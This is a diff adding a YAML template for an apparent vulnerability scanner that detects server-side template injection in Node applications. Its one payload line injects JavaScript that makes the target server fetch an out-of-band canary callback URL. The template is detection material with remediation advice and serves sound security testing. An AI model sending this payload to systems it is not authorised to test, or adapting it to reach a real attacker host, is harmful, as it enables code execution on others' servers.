@@ -1,0 +1,22 @@
+schema_version: rce-finder/v2
+id: node-template-safe-oob
+name: Node server-side template context safe callback validation
+severity: high
+vuln_class: ssti
+cwe: ["CWE-1336"]
+technologies: ["node", "javascript"]
+prerequisites:
+  required_technologies: ["node"]
+mode: safe-validation
+confidence_requirements: ["exact probe ID and HTTP protocol OOB match"]
+remediation: "Do not evaluate untrusted template or expression source. Use fixed templates, escaped data, and patched dependencies."
+references: ["https://owasp.org/www-community/attacks/Server_Side_Template_Injection"]
+oob_protocol: http
+method: POST
+path: ""
+timeout_seconds: 3
+body_content_type: application/json
+injection_points:
+  - location: body
+    name: template
+payload: "${globalThis.fetch('http://{{canary}}/callback')}"
